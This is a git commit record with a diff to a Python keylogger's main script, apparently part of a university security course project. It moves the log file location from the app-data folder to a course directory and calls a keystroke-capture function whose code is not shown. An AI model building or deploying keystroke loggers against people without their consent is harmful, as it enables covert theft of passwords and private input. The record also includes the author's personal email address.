92de9937d45c55be29ed74ee8debf7fc6dc2f63b
Erik Ellis <elliserik69@gmail.com>
2019-11-30 14:59:39 -0500

    Finish to keylogger 1

--- Keyloggers/keylogger1Main.py
+++ Keyloggers/keylogger1Main.py
@@ -2,7 +2,7 @@ import os
 from Keyloggers import keylogger1
 
 def main():
-    log_dir = os.environ['localappdata']
+    log_dir = r'D:\Documents\PSU Fall 2019\SRA 211'
     log_name = 'applog.txt'
 
     keylogger1.getKeystrokes(log_dir, log_name)
